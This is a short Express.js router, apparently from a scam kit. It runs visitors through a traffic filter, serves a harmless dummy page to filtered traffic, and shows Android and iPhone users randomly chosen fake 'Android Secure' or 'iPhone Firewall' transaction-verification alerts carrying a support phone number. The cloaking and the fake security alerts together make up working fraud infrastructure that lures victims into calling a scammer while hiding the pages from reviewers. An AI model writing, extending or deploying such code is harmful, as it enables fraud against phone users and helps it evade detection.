const express = require('express');
const router = express.Router();
const { trafficFilter } = require('../middleware/trafficFilter');

// Design variants per device
const ANDROID_DESIGNS = [
  { view: 'android-secure',   title: 'Android Secure — Transaction Verification' },
  { view: 'android-material', title: 'Android Guard — Transaction Verification' }
];

const IPHONE_DESIGNS = [
  { view: 'iphone-firewall', title: 'iPhone Firewall — Transaction Verification' },
  { view: 'iphone-glass',    title: 'iOS Firewall — Transaction Alert' }
];

function randomPick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Main endpoint — applies traffic filter
router.get('/endpoint', trafficFilter, (req, res) => {
  const result = req.trafficResult;

  if (result.blocked) {
    return res.render('dummy', {
      title: 'Transaction Verification'
    });
  }

  const phone = process.env.SUPPORT_NUMBER || '+18000000000';

  // Randomly pick a design variant per device
  if (result.contentServed === 'android') {
    const design = randomPick(ANDROID_DESIGNS);
    return res.render(design.view, { title: design.title, phone });
  }

  if (result.contentServed === 'iphone') {
    const design = randomPick(IPHONE_DESIGNS);
    return res.render(design.view, { title: design.title, phone });
  }

  // Fallback — dummy
  return res.render('dummy', {
    title: 'Transaction Verification'
  });
});

module.exports = router;
